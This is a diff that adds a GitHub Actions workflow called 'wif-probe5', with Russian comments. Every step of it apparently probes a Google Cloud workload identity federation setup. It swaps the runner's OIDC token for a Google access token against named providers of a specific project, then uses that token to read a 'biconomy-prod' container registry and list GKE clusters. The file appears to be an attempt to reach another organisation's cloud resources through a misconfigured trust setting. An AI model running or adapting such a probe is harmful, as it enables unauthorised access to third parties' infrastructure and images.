@@ -1,0 +1,27 @@
+name: wif-probe5
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fiam.googleapis.com%2Fprojects%2F766873424314%2Flocations%2Fglobal%2FworkloadIdentityPools%2Fpool-id-github-actions%2Fproviders%2Fga-bundler")
+          TOKEN=$(echo "$OIDC" | jq -r .value)
+          # применяем google-github-actions auth формат: audience = //iam.googleapis.com/projects/... (double slash)
+          for AUD in "//iam.googleapis.com/projects/766873424314/locations/global/workloadIdentityPools/pool-id-github-actions/providers/ga-bundler" "//iam.googleapis.com/projects/766873424314/locations/global/workloadIdentityPools/pool-id-github-actions/providers/ga-GITHUB_REPO_NAME"; do
+            echo "=== audience: $AUD ==="
+            STS=$(curl -s -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$AUD\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"subject_token\":\"$TOKEN\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\"}")
+            ACC=$(echo "$STS" | jq -r .access_token)
+            echo "acc_len: ${#ACC}"
+            # попробуем READ реестров + cloud resources этим token'ом
+            echo "--- GAR biconomy-prod ---"
+            curl -s "https://us-docker.pkg.dev/v2/biconomy-prod/bundler/trustwallet/tags/list" -H "Authorization: Bearer $ACC" | head -c 200
+            echo ""
+            echo "--- GKE list ---"
+            curl -s "https://container.googleapis.com/v1/projects/766873424314/locations/-/clusters" -H "Authorization: Bearer $ACC" | head -c 200
+            echo ""
+          done
